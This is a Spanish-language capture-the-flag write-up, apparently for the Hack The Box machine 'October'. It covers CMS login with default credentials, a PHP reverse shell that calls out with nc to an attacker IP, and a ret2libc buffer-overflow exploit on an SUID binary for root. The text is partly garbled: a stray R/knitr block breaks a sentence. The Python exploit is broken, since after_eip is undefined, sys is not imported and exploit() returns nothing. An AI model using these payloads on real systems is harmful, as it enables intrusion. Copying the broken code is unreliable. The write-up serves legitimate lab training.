---
layout: post
title: HTB_October
date: 2023/07/10
slug: HTB_October
heroImage: /assets/machines.jpg
---

# October {-}

## Introduccion {-}

La maquina del dia 14/08/2021 se llama October.

El replay del live se puede ver aqui

[![S4vitaar October maquina](https://img.youtube.com/vi/6vjzcoBA5ps/0.jpg)](https://www.youtube.com/watch?v=6vjzcoBA5ps)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.16
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.16
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.16 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.16 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.16
```

Vemos que estamos en frente de una maquina Linux servido por un Apache 2.4.7 con un php 5.5.9-1.
Vemos que estamos en frente de un October CMS - Vanilla.

#### Checkear la web del puerto 80 {-}

Con firefox navigamos en la web para ver lo que es. El Wappalyzer nos confirma que estamos contra un October CMS y Laravel.
Como es un gestor de contenido buscamos en google la routa del admin panel y vemos que esta en 
```bash
 /backend 
```
.

## Vulnerability Assessment {-}

### Checkeando vulnerabilidades para October CMS {-}

En el panel de login, probamos 
```bash
 admin-admin 
```
 y entramos en el panel de administracion.

;)
## Vuln exploit & Gaining Access {-}

### Ganando accesso desde October CMS {-}

Navigando en la web vemos que hay un fichero .php5 y un boton que nos lleva al fichero

decidimos crearnos un fichero 
```bash
 .php 
```
 y subirlo

```bash
vi shell.php5
```

```php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

Nos ponemos en escucha por el puerto 443 

```bash
nc -nlvp 443
```

y subimos el archivo pulsando el boton upload y con el link que nos da October vamos a la pagina creada.
Vemos que hemos ganado accesso a la maquina victima.

```bash
whoami 

>www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a 
```bash
 cd /home 
```
 vemos que hay un usuario harry que contiene el **user.txt** y podemos ver la flag
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
> Permission denied
id
sudo -l
uname -a

find \-perm -4000 2>/dev/null
```

Aqui vemos un binario interesante 
```bash
 ./usr/local/bin/ovrflw 
```


Lanzamos el binario y vemos que nos pide un input string.


### Bufferoverflow {-}

#### Checkamos si es un bufferoverflow {-}

```bash
ovrflw AAAAAA
ovrflw EEEEEEEEEEEEEEE
which python

ovrflw $(python -c 'print "A"*500')
```

Vemos que hay un **segmentation fault** como error, lo que nos dice que este binario es vulnerable a un Bufferoverflow.

#### Installamos Peda en la maquina victima {-}

Installamos peda en la maquina victima:

```bash
cd /tmp
git clone https://github.com/longld/peda.git
export HOME=/tmp
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

#### Analizamos los registros con peda {-}

```bash
gdb ovrflw
> r
> r AAAA
> r $(python -c 'print "A"*500')
```


![October-EBP-EIP-overwrite](/assets/images/October-EBP-EIP-overwrite.png) 
Aqui vemos que el registrop EBP y EIP han sido sobre escribido. 

#### Buscando el tamaño antes de sobre escribir el EIP {-}

Creamos un patron con peda

```bash
> pattern_create 500
gdb-peda$ pattern_create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAg
AA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAA
wAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%J
A%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%u
A%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3As
IAseAs4AsJAsfAs5AsKAsgAs6A'

> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAA
wAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%u
A%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
```

Si le damos a 
```bash
 p $eip 
```
 ya sabemos que es el valor del eip en este caso 
```bash
 0x41384141 
```
. Ya podemos calcular el offset.

```bash
pattern_offset 0x41384141
```

ya nos dice que el offset es de 112.

Lo comprobamos poniendo 112 A y 4 B.

```bash
> r $(python -c 'print "A"*112 + "B"*4)
```

Aqui ya vemos que el EIP vale 
```bash
 0x42424242 
```
 que son 4 B en hexadecimal

#### Buscando la direccion despues del registro EIP {-}

```bash
> r $(python -c 'print "A"*112 + "B"*4 + "C"*200)
> x/80wx $esp
```

```{r, echo = FALSE, fig.cap="ESP Entries", out.width="90%"}
    knitr::include_graphics("images/October-esp_entries.png")
las proteccionnes del programa con 
![October-es_etries](/assets/images/October-esp_entries.png) 

```bash
> checksec
```

Vemos que el NX esta Enabled. El NX tambien llamado DEP (Data Execution Prevention) es una proteccion que deshabilita la 
ejecucion de codigo en la pila, esto significa que si le ponemos codigo malicioso en el EIP, el flujo del programa no lo 
va a ejecutar.

Como no se puede ejecutar nada directamente en la pila, tenemos que mirar las libraries compartidas del programa para ver
si podemos llamar a otra cosa que la propria pila.

#### Buscando librerias compartidas {-}

```bash
ldd /usr/local/bin/ovrflw
    linux-gate.so
    libc.so.6
    /lib/ld-linux.so.2
```

Aqui la libreria 
```bash
 libc.so 
```
 esta interesante porque nos permitiria ejecutar commandos a nivel de systema. Y si recordamos bien,
el binario ovrflw tiene permisos SUID.

```bash
ldd /usr/local/bin/ovrflw
ldd /usr/local/bin/ovrflw | grep libc
ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}'
ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'
```

Aqui vemos la direccion de la libreria 
```bash
 0xb758a000 
```


Miramos si la direccion cambia a cada ejecucion

```bash
for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
```

Aqui vemos que la direccion esta cambiando. Pero si cojemos una de la direcciones por ejemplo la 
```bash
 0xb75e7000 
```
 y la grepeamos
al bucle

```bash
for i in $(seq 10); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}' | tr -d '()'; done | grep "0xb75e7000"
```

nos damos cuenta que esta direccion apparece multiples vecez. Esto pasa porque estamos frente una maquina de 32 bits.

#### La technica ret2libc {-}

La technica ret2libc es una technica que funcciona de una manera muy sencilla y es poniendole la direccion de la funccion system, seguida de la funccion
exit sequida de la funccion que queremos lanzar con la libreria en nuestro caso un /bin/sh.

Para encontrar la direccionnes de estas funcciones, primero tenemos que encontrar el offset que seria la differencia entre la posicion de la funccion con la
posicion de la libreria. Esto quiere decir que si sumamos los dos, conocemos la direccion de las differentes funccionnes.

Para conocer el offset, utilizamos la utilidad readelf:

1. Buscamos el offset del commado **system** de la libreria libc.so

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "system"
    ```

1. Buscamos el offset del commando **exit** de la misma libreria

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "exit"
    ```

1. Buscamos el offset del commando **/bin/sh** en la misma libreria

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "/bin/sh"
    ```

los offsets encontrados en este caso son:

- system    : 00040310
- exit      : 00033260
- /bin/sh   : 162bac

La utilidad readelf nos permitte ver el offset de estos commandos de manera a que si sumamos la direccion de la libreria libc.so
al offset, conocemos la direccion exacta de los differentes commandos.

Una vez connocemos estas direcciones, utilizaremos la techniqua ret2libc para ejecutar el commando /bin/sh como root.

#### Creamos el exploit en python {-}

```python
#!/usr/bin/python3

import signal
from struct import pack
from subprocess import call

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

#Ctrl_C
signal.signal(signal.SIGINT, def_handler)

def exploit():
    base_libc_address = 0xb75e7000

    system_address_offset = 0x00040310
    exit_address_offset = 0x00033260
    bin_sh_address_offset = 0x00162bac

    system_address = pack("<I", base_libc_address + system_address_offset)
    exit_address = pack("<I", base_libc_address + exit_address_offset)
    bin_sh = pack("<I", base_libc_address + bin_sh_address_offset)

    offset = 112
    before_eip = b"A"*offset
    eip = system_address + exit_address + bin_sh

    payload = before_eip + eip + after_eip

if __name__ == '__main__':
    payload = exploit()

    while True:
        response = call(["/usr/local/bin/ovrflw", payload])

        if response == 0:
            print("\n\n[!] Saliendo...\n\n")
            sys.exit(1)

```

En este script podemos ver que el valor que queremos dar al EIP es el **ret2libc** (system address + exit address + /bin/sh address).

Si lanzamos el script 
```bash
 python3 exploit.py 
```
, va a tardar un poco. Tardara finalmente el tiempo que la direccion de la libreria libc sea la misma 
que la que hemos puesto en el script.

Ya vemos que nos entabla un /bin/sh y 
```bash
 whoami 
```
 -> root.

